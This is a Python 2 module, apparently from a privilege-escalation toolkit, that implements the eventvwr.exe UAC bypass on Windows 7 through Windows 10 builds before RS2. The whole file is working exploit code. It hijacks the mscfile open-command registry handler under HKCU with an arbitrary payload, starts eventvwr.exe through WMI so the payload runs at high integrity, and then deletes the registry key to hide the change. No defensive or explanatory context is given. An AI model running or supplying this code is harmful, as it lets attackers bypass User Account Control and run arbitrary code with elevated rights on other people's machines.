"""
Works from: Windows 7 (7600)
Fixed in: Windows 10 RS2 (15031)
"""
import os
import wmi
import time
import _winreg
from core.prints import *

wmi = wmi.WMI()

def eventvwr(payload):
	print """
 -------------------------------------------------------------
 eventvwr.exe is an auto-elevated binary that is vulnerable
 to file handler hijacking. 
 
 Read access to HKCU\Software\Classes\mscfile\shell\open
 \command is performed upon execution. Due to the registry
 key being accessible from user mode, an arbitrary
 executable file can be injected.

 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))
	print_info("Attempting to create registry key")
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))				
		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
		_winreg.CloseKey(key)
	except Exception as error:
		print_error("Unable to create key")
		return False
	else:
		print_success("Registry key created")

	print_info("Pausing for 5 seconds before executing")
	time.sleep(5)

	print_info("Attempting to create process")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start eventvwr.exe",
							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
		if (result[1] == 0):
			print_success("Process started successfully")
		else:
			print_error("Problem creating process")
	except Exception as error:
		print_error("Problem creating process")
		return False
	
	print_info("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print_info("Attempting to remove registry key")
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))
	except Exception as error:
		print_error("Unable to delete key")
		return False
	print_success("Registry key was deleted")
